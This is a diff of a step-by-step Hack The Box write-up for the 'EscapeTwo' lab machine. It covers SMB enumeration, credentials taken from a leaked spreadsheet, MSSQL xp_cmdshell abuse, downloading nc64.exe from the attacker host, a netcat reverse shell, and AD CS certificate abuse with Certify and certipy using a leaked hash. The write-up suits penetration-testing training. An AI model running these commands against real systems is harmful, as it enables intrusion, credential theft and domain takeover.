@@ -18,7 +18,8 @@ escapetwo.htb**
 ALTERNATIVE: **sudo nmap -Pn -p- \--min-rate 5000 \--max-rate 10000 -T4
 -sC -sV -oN nmap-aggressive.txt escapetwo.htb**
 
-![](images/media/image1.png)
+![](images/media/image1.png){width="4.981042213473316in"
+height="4.962369860017498in"}
 
 3\. INFO: Get infos on HOSTS, SERVICES, SHARES
 
@@ -27,19 +28,22 @@ INFO: account: rose / KxEPkKe6R8su
 RUN: **crackmapexec smb escapetwo.htb -u \"rose\" -p \"KxEPkKe6R8su\"
 \--rid-brute \| grep SidTypeUser**
 
-![](images/media/image2.png)
+![](images/media/image2.png){width="6.227487970253718in"
+height="1.222840113735783in"}
 
 3.1 INFO: add DC01 to hosts file
 
 RUN: **sudo nano /ets/hosts**
 
-![](images/media/image3.png)
+![](images/media/image3.png){width="3.7061614173228348in"
+height="2.8889260717410323in"}
 
-4\. INFO: Try SMB first. SMB file leak!
+4\. INFO: Try SMB first. SMB file leak! USE HYH ALTERNATIVE!!
 
-ALTERNATIVE: **smbclient -L //10.10.11.51 -U rose**
+HYH ALTERNATIVE: **smbclient -L //10.10.11.51 -U rose**
 
-![](images/media/image4.png)
+![](images/media/image4.png){width="5.679601924759405in"
+height="2.0426541994750655in"}
 
 4.1 INFO: Download accounting_2024.xlsx accounts.xlsx to KALI VM. Open
 files with LibreOFFICE or gnumeric in LINUX
@@ -52,11 +56,13 @@ see CN-SEC.COM solution)
 
 RESULT: FOUND USER:PASSWORD =\> sa:MSSQLP@ssw0rd!
 
-![](images/media/image5.png)
+![](images/media/image5.png){width="6.298611111111111in"
+height="1.113888888888889in"}
 
 Open xlsx-files with LibreOffice Calc or Gnumeric
 
-![](images/media/image6.png)
+![](images/media/image6.png){width="4.402843394575678in"
+height="0.9482895888013998in"}
 
 4.2 WORKAROUND for xlsx-files
 
@@ -67,7 +73,8 @@ RUN: **file accounts.xlsx RESULT: It\'s a ZIP file**
 NEXT: Extract sharedStrings.xml from accounts.xlsx and open it look for
 SA-USER and his PASSWORD
 
-![](images/media/image7.png)
+![](images/media/image7.png){width="6.284027777777778in"
+height="1.6020833333333333in"}
 
 **FOOTHOLD**
 
@@ -76,7 +83,8 @@ SA-USER and his PASSWORD
 RUN WORKED: **impacket-mssqlclient
 escapetwo.htb/sa:MSSQLP\\@ssw0rd\\!\\@10.10.11.51**
 
-![](images/media/image8.png)
+![](images/media/image8.png){width="6.29375in"
+height="2.2083333333333335in"}
 
 **Sa**= System Administrator, **dbo**= Schema, **master**= Current
 Database context is master system database
@@ -85,19 +93,22 @@ Database context is master system database
 
 RUN: **xp_cmdshell whoami**
 
-![](images/media/image9.png)
+![](images/media/image9.png){width="7.008729221347331in"
+height="0.4597156605424322in"}
 
 5.3 INFO:
 
 RUN: **enable_xp_cmdshell**
 
-![](images/media/image10.png)
+![](images/media/image10.png){width="5.781990376202975in"
+height="0.4130905511811024in"}
 
 5.4 INFO: Check USER AGAIN
 
 RUN: **xp_cmdshell whoami**
 
-![](images/media/image11.png)
+![](images/media/image11.png){width="2.289099956255468in"
+height="0.8428215223097113in"}
 
 5.5 INFO: Download NETCAT for Windows https://github.com/int0x33/nc.exe/
 
@@ -106,7 +117,8 @@ Kali VM and RUN command on TARGET MACHINE (SERVER)!
 
 RUN on Kali VM: **python3 -m http.server 80**
 
-![](images/media/image12.png)
+![](images/media/image12.png){width="6.288888888888889in"
+height="4.4125in"}
 
 RUN on SERVER: **xp_cmdshell curl 10.10.14.163/nc64.exe -o
 C:\\Users\\public\\nc64.exe** (Has to be done fast, otherwise STEP 5.3
@@ -116,14 +128,16 @@ has to be repeated) 10.10.14.184 is Kali VM IP!
 
 RUN on Kali VM: **nc -lvnp 9999**
 
-![](images/media/image13.png)
+![](images/media/image13.png){width="2.777251749781277in"
+height="0.645087489063867in"}
 
 5.7 INFO: Connects from Server to Kali VM.
 
 RUN on SERVER: **xp_cmdshell C:\\Users\\public\\nc64.exe 10.10.14.163
 9999 -e cmd.exe**
 
-![](images/media/image14.png)
+![](images/media/image14.png){width="6.29375in"
+height="1.7722222222222221in"}
 
 **GET USER**
 
@@ -144,19 +158,22 @@ RUN on SERVER: **cd ExpressAdv_ENU**
 
 RUN on SERVER: **dir**
 
-![](images/media/image15.png)
+![](images/media/image15.png){width="3.568720472440945in"
+height="4.727185039370079in"}
 
 7.1 INFO: Display file content
 
 RUN on SERVER: **type sql-Configuration.INI** (displays the file in cmd
 terminal)
 
-![](images/media/image16.png)
+![](images/media/image16.png){width="3.497630139982502in"
+height="2.7524081364829396in"}
 
 7.2 INFO: Search for USERS in directory of the SERVER and try the
 PASSWORD from STEP 7.1 to login with
 
-![](images/media/image17.png)
+![](images/media/image17.png){width="4.346277340332459in"
+height="4.199051837270341in"}
 
 7.3 INFO: POWERSHELL remote login
 
@@ -166,7 +183,8 @@ RUN: cd ../Desktop
 
 RUN: type user.txt
 
-**PRIVILEGE_ESCALATION**
+HYH
+SOLUTION-///-PRIVILEGE_ESCALATION-//////////////////////////////////////////////////////
 
 8\. INFO: Add sequel.htb and dc01.sequel.htb to /etc/hosts
 
@@ -238,20 +256,20 @@ escapetwo.htb/sa:MSSQLP\\@ssw0rd\\!\\@10.10.11.51
 
 RUN on SERVER: enable_xp_cmdshell
 
-RUN Loggedin on SERVER: mkdir C:\\temp
+RUN LOGGEDIN on POWERSHELL, on SERVER: mkdir C:\\temp
 
 RUN on SERVER: xp_cmdshell curl 10.10.14.184/Certify.exe -o
 C:\\Users\\public\\Certify.exe (Uploads Certify.exe to SERVER)
 
-RUN Loggedin on SERVER: C:\\temp\> ./Certify.exe find
+RUN LOGGEDIN on POWERSHELL, on SERVER: C:\\temp\> ./Certify.exe find
 /domain:sequel.htb
 
 10\. 2nd INFO: Change directory
 
 RUN: cd C:\\temp
 
-12\. INFO: Run Certify.exe. You can see that ca_svc has overwrite
-permissions for this certificate, try to overwrite it. (IN NEXT
+12\. INFO: Run Certify.exe. You can see that ca_svc has overridable
+permissions for this certificate 👆, so let\'s overwrite it. (IN NEXT
 STEP)
 
 RUN: .\\Certify.exe find /domain:sequel.htb
@@ -266,6 +284,13 @@ dc01.sequel.htb
 request is made to obtain an authentication ticket to the target system.
 
 IMPORTANT: Paste HASH 3b181b914e7a9d5508ea1e20bc2b7fce from STEP 9
+
+THIS DID NOT WORK !!!!!! =\>\>
+
+RUN on Kali VM: certipy-ad req -u ca_svc -hashes
+\'3b181b914e7a9d5508ea1e20bc2b7fce\' -ca sequel-DC01-CA -target
+sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn
+administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug
 
 15\. INFO: Get the Administrator\'s hash through the certificate
 
